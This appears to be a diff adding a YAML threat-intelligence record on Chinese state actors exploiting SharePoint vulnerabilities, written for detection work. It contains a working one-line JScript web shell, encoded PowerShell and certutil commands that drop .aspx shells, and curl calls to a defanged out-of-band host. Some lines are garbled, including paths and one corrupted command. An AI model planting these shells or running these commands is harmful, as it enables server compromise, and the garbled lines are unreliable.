@@ -1,0 +1,89 @@
+description: The Trustwave SpiderLabs CTI team identified widespread exploitation
+  of Microsoft SharePoint on-premises infrastructure by multiple Chinese nation-state
+  actors, including Linen Typhoon and Violet Typhoon, as well as Storm-2603. The attackers
+  leveraged several vulnerabilities (CVE-2025-49704, CVE-2025-49706, CVE-2025-53770,
+  CVE-2025-53771) to perform unauthenticated code execution and deploy web shells
+  for persistent access.
+attribution:
+- Linen Typhoon
+- Violet Typhoon
+- Storm-2603
+malware_families:
+- China Chopper
+- AntSword
+TTPs:
+  processes:
+  - w3wp.exe
+  - cmd.exe
+  - certutil.exe
+  - curl.exe
+  commandline:
+  - cmd.exe /c powershell -EncodedCommand JABIACAAPQAZACIAUABDAFYAQQBJAEUAbABOAGMARWASAHKAZABDAE...e
+    4 N A A N NSNS NS 0 AU A SN LAY RISt bi e RO D TR A ST ATLAGU pn ert maece VAt
+    P10s e e T ety eke e S e A e el Sey S B R R A T 4 g et S*
+  - cmd.exe /c certutil -decode C:\\PROGRA~T1\\COMMON~1\\MICROS~1\\WEBSER~1\\16\\TEMPLATE\\LAYOUTS\\{filename}.css
+    C:\\PROGRA~T1\\COMMON~1\\MICROS~1\\WEBSER~1\\16\\TEMPLATE\\LAYOUTS\\{filename}.aspx
+  - cmd.exe /c certutil -decode C:\\PROGRA~T1\\COMMON~1\\MICROS~1\\WEBSER~1\\16\\TEMPLATE\\LAYOUTS\\{filename}.css
+    C:\\PROGRA~T1\\COMMON~1\\MICROS~1\\WEBSER~1\\16\\TEMPLATE\\LAYOUTS\\{filename}.css
+  - cmd.exe /c ipconfig /all
+  - cmd.exe /c ipconfig.exe /all
+  - cmd.exe /c ping n 2 8.8.8.8
+  - cmd.exe /c tasklist /v
+  - cmd.exe /c curl hxxp://{random}.requestrepo[.Jcom
+  - cmd.exe /c ping -n 2 {random}.requestrepo[.Jcom
+  powershell:
+  - '[System.IO.File]::WriteAllBytes("C:\\PROGRA~1\\COMMON~1\\MICROS~1\\WEBSER~1\\16\\TEMPLATE\\LAYOUTS\\list_display.aspx",
+    [System.Convert]::FromBase64String("PCVAIFBhZ2UgTGFuZ3VhZ2U9...ZSIpOyU+"))'
+  - '[System.IO.File]::WriteAllBytes("C:\\PROGRA~1\\COMMON~1\\MICROS~1\\WEBSER~1\\16\\TEMPLATE\\LAYOUTS\\listdisplay.aspx",
+    [System.Convert]::FromBase64String("PCVAIFBhZ2UgTGFuZ3VhZ2U9...iKTsPg=="))'
+  scripting_engine:
+  - <%@ Page Language="Jscript" %><% eval(Request.Item["password"], "un" + "safe");
+    %>
+  - <%@Page Language=Jscript%><% var fso = new ActiveXObject("Scripting.FileSystemObject");var
+    filePath = Server.MapPath("/_layouts/15/{filename}.css");var fileStream = fso.OpenTextFile(filePath,2,true);fileStream.WriteLine("11111");fileStream.Close();
+    %>
+  registry_keys: []
+  image_load:
+  - w3wp.exe -ap "[REDACTED APP POOL]" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\[REDACTED
+    PIPE] -h "C:\\inetpub\\temp\\apppools\\[REDACTED CONFIG PATH]" -w ""-m 0o
+  network_connections:
+  - cmd.exe /c curl hxxp://{random}.requestrepo[.Jcom
+  - cmd.exe /c ping -n 2 {random}.requestrepo[.Jcom
+  file_activity:
+  - C:\\PROGRA~T1\\COMMON~1\\MICROS~1\\WEBSER~1\\16\\TEMPLATE\\LAYOUTS\\{filename}.css
+  - C:\\PROGRA~T1\\COMMON~1\\MICROS~1\\WEBSER~1\\16\\TEMPLATE\\LAYOUTS\\{filename}.aspx
+  - C:\\PROGRA~1\\COMMON~1\\MICROS~1\\WEBSER~1\\16\\TEMPLATE\\LAYOUTS\\list_display.aspx
+  - C:\\PROGRA~1\\COMMON~1\\MICROS~1\\WEBSER~1\\16\\TEMPLATE\\LAYOUTS\\listdisplay.aspx
+  persistence:
+  - w3wp.exe -ap "[REDACTED APP POOL]" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\[REDACTED
+    PIPE] -h "C:\\inetpub\\temp\\apppools\\[REDACTED CONFIG PATH]" -w ""-m 0o
+  - cmd.exe /c powershell -EncodedCommand JABIACAAPQAZACIAUABDAFYAQQBJAEUAbABOAGMARWASAHKAZABDAE..
+  - cmd.exe /c certutil -decode C:\\PROGRA~T1\\COMMON~1\\MICROS~1\\WEBSER~1\\16\\TEMPLATE\\LAYOUTS\\{filename}.css
+    C:\\PROGRA~T1\\COMMON~1\\MICROS~1\\WEBSER~1\\16\\TEMPLATE\\LAYOUTS\\{filename}.aspx
+  - cmd.exe /c certutil -decode C:\\PROGRA~T1\\COMMON~1\\MICROS~1\\WEBSER~1\\16\\TEMPLATE\\LAYOUTS\\{filename}.css
+    C:\\PROGRA~T1\\COMMON~1\\MICROS~1\\WEBSER~1\\16\\TEMPLATE\\LAYOUTS\\{filename}.css
+  - cmd.exe /c ipconfig /all
+  - cmd.exe /c ipconfig.exe /all
+  - cmd.exe /c ping n 2 8.8.8.8
+  - cmd.exe /c tasklist /v
+  - cmd.exe /c curl hxxp://{random}.requestrepo[.Jcom
+  - cmd.exe /c ping -n 2 {random}.requestrepo[.Jcom
+  pipes:
+  - \\.\pipe\[REDACTED PIPE]
+  process_relations: []
+IOCs:
+  hashes:
+  - ''
+  IPs:
+  - ''
+  domains:
+  - hxxp://{random}.requestrepo[.Jcom
+  URLs:
+  - hxxp://{random}.requestrepo[.Jcom
+authors:
+- Serhii Melnyk
+- Cris Tomboc
+- King Orande
+reference: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/echoes-in-the-shell-legacy-tooling-behind-ongoing-sharepoint-toolshell-exploitation/
+date_of_publication: August 08, 2025
+file_creation_date: August 12, 2025
